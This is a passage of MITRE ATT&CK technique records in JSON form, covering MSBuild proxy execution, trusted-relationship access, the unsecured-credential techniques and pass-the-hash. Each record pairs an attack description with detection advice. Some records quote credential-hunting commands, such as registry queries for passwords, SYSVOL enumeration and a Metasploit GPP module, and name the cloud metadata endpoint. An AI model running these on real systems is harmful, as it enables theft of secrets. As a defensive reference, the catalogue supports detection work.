potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.","platforms":"Windows","data sources":"Command: Command Execution, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Application Control","contributors":"Casey Smith; Matthew Demaske, Adaptforward","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1127.001","name":"Trusted Developer Utilities Proxy Execution: MSBuild","description":"Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.(Citation: MSDN MSBuild)\n\nAdversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.(Citation: MSDN MSBuild)(Citation: Microsoft MSBuild Inline Tasks 2017) MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS Msbuild)","url":"https://attack.mitre.org/techniques/T1127/001","created":"27 March 2020","last modified":"15 October 2021","version":"1.2","tactics":"Defense Evasion","detection":"Use process monitoring to monitor the execution and arguments of MSBuild.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.","platforms":"Windows","data sources":"Command: Command Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1127","defenses bypassed":null,"contributors":"@ionstorm; Carrie Roberts, @OrOneEqualsOne","permissions required":null,"supports remote":null,"system requirements":".NET Framework version 4 or higher","impact type":null,"effective permissions":null,"relationship citations":"(Citation: Github PowerShell Empire),(Citation: Talos Frankenstein June 2019),(Citation: Palo Alto PlugX June 2017),(Citation: Microsoft WDAC)"}
{"ID":"T1199","name":"Trusted Relationship","description":"Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)","url":"https://attack.mitre.org/techniques/T1199","created":"18 April 2018","last modified":"21 October 2022","version":"2.3","tactics":"Initial Access","detection":"Establish monitoring for activity conducted by second and third party providers and other trusted entities that may be leveraged as a means to gain access to the network. Depending on the type of relationship, an adversary may have access to significant amounts of information about the target before conducting an operation, especially if the trusted relationship is based on IT services. Adversaries may be able to act quickly towards an objective, so proper monitoring for behavior related to Credential Access, Lateral Movement, and Collection will be important to detect the intrusion.","platforms":"IaaS, Linux, Office 365, SaaS, Windows, macOS","data sources":"Application Log: Application Log Content, Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, Network Traffic: Network Traffic Content","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"ExtraHop; Jannie Li, Microsoft Threat Intelligence Center (MSTIC); Praetorian","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Microsoft POLONIUM June 2022),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Secureworks REvil September 2019),(Citation: CrowdStrike StellarParticle January 2022),(Citation: DOJ GRU Indictment Jul 2018),(Citation: FireEye APT10 April 2017),(Citation: MSTIC Nobelium Oct 2021),(Citation: Profero APT27 December 2020),(Citation: DOJ APT10 Dec 2018),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Symantec Cicada November 2020),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Microsoft Nobelium Admin Privileges),(Citation: Office 365 Partner Relationships)"}
{"ID":"T1552","name":"Unsecured Credentials","description":"Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)), or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).","url":"https://attack.mitre.org/techniques/T1552","created":"04 February 2020","last modified":"13 April 2023","version":"1.3","tactics":"Credential Access","detection":"While detecting adversaries accessing credentials may be difficult without knowing they exist in the environment, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information.\n\nMonitor for suspicious file access activity, specifically indications that a process is reading multiple files in a short amount of time and/or using command-line arguments  indicative of searching for credential material (ex: regex patterns). These may be indicators of automated/scripted credential access behavior.\n\nMonitoring when the user's <code>.bash_history</code> is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like \"history\" instead of commands like <code>cat ~/.bash_history</code>.\n\nAdditionally, monitor processes for applications that can be used to query the Registry, such as [Reg](https://attack.mitre.org/software/S0075), and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.","platforms":"Azure AD, Containers, Google Workspace, IaaS, Linux, Network, Office 365, SaaS, Windows, macOS","data sources":"Application Log: Application Log Content, Command: Command Execution, File: File Access, Process: Process Creation, User Account: User Account Authentication, Windows Registry: Windows Registry Key Access","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Austin Clark, @c2defense","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Cybereason Astaroth Feb 2019),(Citation: Microsoft MS14-025),(Citation: RedLock Instance Metadata API 2018),(Citation: ADSecurity Finding Passwords in SYSVOL),(Citation: MS14-025)"}
{"ID":"T1552.003","name":"Unsecured Credentials: Bash History","description":"Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user’s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)","url":"https://attack.mitre.org/techniques/T1552/003","created":"04 February 2020","last modified":"08 March 2022","version":"1.1","tactics":"Credential Access","detection":"Monitoring when the user's <code>.bash_history</code> is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like \"history\" instead of commands like <code>cat ~/.bash_history</code>.","platforms":"Linux, macOS","data sources":"Command: Command Execution, File: File Access","is sub-technique":true,"sub-technique of":"T1552","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Aqua Kinsing April 2020),"}
{"ID":"T1552.008","name":"Unsecured Credentials: Chat Messages","description":"Adversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.\n\nRather than accessing the stored chat logs (i.e., [Credentials In Files](https://attack.mitre.org/techniques/T1552/001)), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation (Citation: Slack Security Risks).","url":"https://attack.mitre.org/techniques/T1552/008","created":"14 March 2023","last modified":"11 April 2023","version":"1.0","tactics":"Credential Access","detection":null,"platforms":"Google Workspace, Office 365, SaaS","data sources":"Application Log: Application Log Content","is sub-technique":true,"sub-technique of":"T1552","defenses bypassed":null,"contributors":"Douglas Weir","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: MSTIC DEV-0537 Mar 2022),"}
{"ID":"T1552.005","name":"Unsecured Credentials: Cloud Instance Metadata API","description":"Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n","url":"https://attack.mitre.org/techniques/T1552/005","created":"11 February 2020","last modified":"21 March 2023","version":"1.4","tactics":"Credential Access","detection":"Monitor access to the Instance Metadata API and look for anomalous queries.\n\nIt may be possible to detect adversary use of credentials they have obtained such as in [Valid Accounts](https://attack.mitre.org/techniques/T1078).","platforms":"IaaS","data sources":"User Account: User Account Authentication","is sub-technique":true,"sub-technique of":"T1552","defenses bypassed":null,"contributors":"Praetorian","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Peirates GitHub),(Citation: Unit 42 Hildegard Malware),(Citation: Cisco Talos Intelligence Group),(Citation: Trend Micro TeamTNT),(Citation: Amazon AWS IMDS V2),(Citation: RedLock Instance Metadata API 2018)"}
{"ID":"T1552.007","name":"Unsecured Credentials: Container API","description":"Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.(Citation: Docker API)(Citation: Kubernetes API)\n\nAn adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment.(Citation: Unit 42 Unsecured Docker Daemons) An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components. ","url":"https://attack.mitre.org/techniques/T1552/007","created":"31 March 2021","last modified":"15 April 2023","version":"1.2","tactics":"Credential Access","detection":"Establish centralized logging for the activity of container and Kubernetes cluster components. Monitor logs for actions that could be taken to gather credentials to container and cloud infrastructure, including the use of discovery API calls by new or unexpected users and APIs that access Docker logs.\n\nIt may be possible to detect adversary use of credentials they have obtained such as in [Valid Accounts](https://attack.mitre.org/techniques/T1078).","platforms":"Containers","data sources":"Command: Command Execution, User Account: User Account Authentication","is sub-technique":true,"sub-technique of":"T1552","defenses bypassed":null,"contributors":"Center for Threat-Informed Defense (CTID); Jay Chen, Palo Alto Networks; Yossi Weizman, Azure Defender Research Team","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Peirates GitHub),(Citation: Kubernetes Service Accounts),(Citation: Kubernetes API Control Access),(Citation: Kubernetes Hardening Guide),(Citation: Kubernetes RBAC),(Citation: Microsoft AKS Azure AD 2023),(Citation: Docker Daemon Socket Protect),(Citation: Kubernetes Cloud Native Security)"}
{"ID":"T1552.001","name":"Unsecured Credentials: Credentials In Files","description":"Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)\n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)","url":"https://attack.mitre.org/techniques/T1552/001","created":"04 February 2020","last modified":"30 March 2023","version":"1.1","tactics":"Credential Access","detection":"While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information.","platforms":"Containers, IaaS, Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Access","is sub-technique":true,"sub-technique of":"T1552","defenses bypassed":null,"contributors":"Jay Chen, Palo Alto Networks; Microsoft Threat Intelligence Center (MSTIC); Rory McCune, Aqua Security; Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team","permissions required":"Administrator, SYSTEM, User","supports remote":null,"system requirements":"Access to files","impact type":null,"effective permissions":null,"relationship citations":"(Citation: Volexity Patchwork June 2018),(Citation: Cisco Talos Intelligence Group),(Citation: Symantec Buckeye),(Citation: Trend Micro TeamTNT),(Citation: Securelist BlackEnergy Nov 2014),(Citation: Symantec Leafminer July 2018),(Citation: US-CERT Emotet Jul 2018),(Citation: FireEye APT34 July 2019),(Citation: FireEye APT33 Guardrail),(Citation: TrendMicro Trickbot Feb 2019),(Citation: Cyberreason Anchor December 2019),(Citation: Kaspersky Adwind Feb 2016),(Citation: Invincea XTunnel),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: CERT-FR PYSA April 2020),(Citation: Cado Security TeamTNT Worm August 2020),(Citation: AADInternals Documentation),(Citation: F-Secure BlackEnergy 2014),(Citation: Talos Smoke Loader July 2018),(Citation: GitHub PoshC2),(Citation: Symantec Elfin Mar 2019),(Citation: Github PowerShell Empire),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: Unit 42 Hildegard Malware),(Citation: Unit42 OilRig Playbook 2023),(Citation: CIS Emotet Dec 2018),(Citation: GitHub QuasarRAT),(Citation: Trend Micro Trickbot Nov 2018),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Symantec MuddyWater Dec 2018),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: CrowdStrike Putter Panda),(Citation: Unit42 Azorult Nov 2018),(Citation: FireEye APT35 2018),(Citation: GitHub Pupy),(Citation: Proofpoint TA505 Sep 2017),(Citation: GitHub LaZagne Dec 2018),"}
{"ID":"T1552.002","name":"Unsecured Credentials: Credentials in Registry","description":"Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)\n\n* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>\n* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>","url":"https://attack.mitre.org/techniques/T1552/002","created":"04 February 2020","last modified":"07 February 2020","version":"1.0","tactics":"Credential Access","detection":"Monitor processes for applications that can be used to query the Registry, such as [Reg](https://attack.mitre.org/software/S0075), and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.","platforms":"Windows","data sources":"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Access","is sub-technique":true,"sub-technique of":"T1552","defenses bypassed":null,"contributors":"Sudhanshu Chauhan, @Sudhanshu_C","permissions required":"Administrator, User","supports remote":null,"system requirements":"Ability to query some Registry locations depends on the adversary's level of access. User permissions are usually limited to access of user-related Registry keys.","impact type":null,"effective permissions":null,"relationship citations":"(Citation: CrowdStrike IceApple May 2022),(Citation: Pentestlab Stored Credentials),(Citation: TrendMicro Trickbot Feb 2019),(Citation: Cybereason Oceanlotus May 2017),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: SentinelOne Valak June 2020),(Citation: Cybereason Cobalt Kitty 2017),"}
{"ID":"T1552.006","name":"Unsecured Credentials: Group Policy Preferences","description":"Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)\n\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit’s post exploitation module: <code>post/windows/gather/credentials/gpp</code>\n* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>\n","url":"https://attack.mitre.org/techniques/T1552/006","created":"11 February 2020","last modified":"17 June 2020","version":"1.0","tactics":"Credential Access","detection":"Monitor for attempts to access SYSVOL that involve searching for XML files. \n\nDeploy a new XML file with permissions set to Everyone:Deny and monitor for Access Denied errors.(Citation: ADSecurity Finding Passwords in SYSVOL)","platforms":"Windows","data sources":"Command: Command Execution, File: File Access","is sub-technique":true,"sub-technique of":"T1552","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: PowerSploit Documentation),(Citation: GitHub PowerSploit May 2012),(Citation: Symantec Elfin Mar 2019),(Citation: FireEye APT33 Guardrail),(Citation: Microsoft MS14-025),(Citation: MS14-025),(Citation: ADSecurity Finding Passwords in SYSVOL)"}
{"ID":"T1552.004","name":"Unsecured Credentials: Private Keys","description":"Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)\n\nWhen a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device’s identity.(Citation: Microsoft Primary Refresh Token) An adversary with access to the device may be able to export the keys in order to impersonate the device.(Citation: AADInternals Azure AD Device Identities)\n\nOn network devices, private keys may be exported via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `crypto pki export`.(Citation: cisco_deploy_rsa_keys) \n\nSome private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.","url":"https://attack.mitre.org/techniques/T1552/004","created":"04 February 2020","last modified":"12 April 2023","version":"1.1","tactics":"Credential Access","detection":"Monitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication. For network infrastructure devices, collect AAA logging to monitor for private keys being exported.","platforms":"Linux, Network, Windows, macOS","data sources":"Command: Command Execution, File: File Access","is sub-technique":true,"sub-technique of":"T1552","defenses bypassed":null,"contributors":"Austin Clark, @c2defense; Itzik Kotler, SafeBreach","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Adsecurity Mimikatz Guide),(Citation: Cado Security TeamTNT Worm August 2020),(Citation: AADInternals Documentation),(Citation: MSTIC FoggyWeb September 2021),(Citation: Aqua Kinsing April 2020),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: Github PowerShell Empire),(Citation: ESET Machete July 2019),(Citation: Kaspersky Adwind Feb 2016),(Citation: ESET Ebury Feb 2014),(Citation: Unit 42 Hildegard Malware),(Citation: SentinelLabs Metador Sept 2022),(Citation: Anomali Rocke March 2019),(Citation: Microsoft 365 Defender Solorigate),(Citation: FoxIT Wocao December 2019),(Citation: Trend Micro TeamTNT),(Citation: Microsoft Primary Refresh Token),(Citation: cisco_deploy_rsa_keys)"}
{"ID":"T1535","name":"Unused/Unsupported Cloud Regions","description":"Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.\n\nCloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.\n\nA variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.\n\nAn example of adversary use of unused AWS regions is to mine cryptocurrency through [Resource Hijacking](https://attack.mitre.org/techniques/T1496), which can cost organizations substantial amounts of money over time depending on the processing power used.(Citation: CloudSploit - Unused AWS Regions)","url":"https://attack.mitre.org/techniques/T1535","created":"04 September 2019","last modified":"22 April 2021","version":"1.1","tactics":"Defense Evasion","detection":"Monitor system logs to review activities occurring across all cloud environments and regions. Configure alerting to notify of activity in normally unused regions or if the number of instances active in a region goes above a certain threshold.(Citation: CloudSploit - Unused AWS Regions)","platforms":"IaaS","data sources":"Instance: Instance Creation, Instance: Instance Metadata","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Netskope","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: CloudSploit - Unused AWS Regions)"}
{"ID":"T1550","name":"Use Alternate Authentication Material","description":"Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n","url":"https://attack.mitre.org/techniques/T1550","created":"30 January 2020","last modified":"01 April 2022","version":"1.2","tactics":"Defense Evasion, Lateral Movement","detection":"Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).","platforms":"Containers, Google Workspace, IaaS, Office 365, SaaS, Windows","data sources":"Active Directory: Active Directory Credential Request, Application Log: Application Log Content, Logon Session: Logon Session Creation, User Account: User Account Authentication, Web Credential: Web Credential Usage","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"System Access Controls","contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Secureworks IRON RITUAL Profile),(Citation: Microsoft 365 Defender Solorigate),(Citation: MSTIC FoggyWeb September 2021),"}
{"ID":"T1550.001","name":"Use Alternate Authentication Material: Application Access Token","description":"Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) \n\nOAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\n\nFor example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.(Citation: Google Cloud Service Account Credentials)(Citation: AWS Temporary Security Credentials) The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured – for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.(Citation: Rhino Security Labs Enumerating AWS Roles)\n\nDirect API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.  For example, in AWS environments, an adversary who compromises a user’s AWS API credentials may be able to use the `sts:GetFederationToken` API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated.(Citation: Crowdstrike AWS User Federation Persistence) Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.","url":"https://attack.mitre.org/techniques/T1550/001","created":"30 January 2020","last modified":"04 May 2023","version":"1.5","tactics":"Defense Evasion, Lateral Movement","detection":"Monitor access token activity for abnormal use and permissions granted to unusual or suspicious applications and APIs. Additionally, administrators should review logs for calls to the AWS Security Token Service (STS) and usage of GCP service accounts in order to identify anomalous actions.(Citation: AWS Logging IAM Calls)(Citation: GCP Monitoring Service Account Usage)","platforms":"Azure AD, Containers, Google Workspace, IaaS, Office 365, SaaS","data sources":"Web Credential: Web Credential Usage","is sub-technique":true,"sub-technique of":"T1550","defenses bypassed":"System Access Controls","contributors":"Dylan Silva, AWS Security; Ian Davila, Tidal Cyber; Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services); Jen Burns, HubSpot; Mark Wee; Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC); Shailesh Tiwary (Indian Army)","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Trend Micro Pawn Storm OAuth 2017),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Microsoft POLONIUM June 2022),(Citation: Peirates GitHub),(Citation: Microsoft Azure AD Admin Consent)"}
{"ID":"T1550.002","name":"Use Alternate Authentication Material: Pass the Hash","description":"Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\n\nWhen performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\n\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)","url":"https://attack.mitre.org/techniques/T1550/002","created":"30 January 2020","last modified":"30 March 2023","version":"1.1","tactics":"Defense Evasion, Lateral Movement","detection":"Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.\n\nEvent ID 4768 and 4769 will also be generated on the Domain Controller when a user requests a new ticket granting ticket or service ticket. These events combined with the above activity may be indicative of an overpass the hash attempt.(Citation: Stealthbits Overpass-the-Hash)","platforms":"Windows","data sources":"Active Directory: Active Directory Credential Request, Logon Session: Logon Session Creation, User Account: User Account Authentication","is sub-technique":true,"sub-technique of":"T1550","defenses bypassed":"System Access Controls","contributors":"Blake Strom, Microsoft 365 Defender; Travis Smith, Tripwire","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Adsecurity Mimikatz Guide),(Citation: NCC Group Chimera January 2021),(Citation: McAfee Night Dragon),(Citation: Cybereason Soft Cell June 2019),(Citation: Mandiant APT1),(Citation: CISA AA20-301A Kimsuky),(Citation: Github PowerShell Empire),(Citation: US-CERT HOPLIGHT 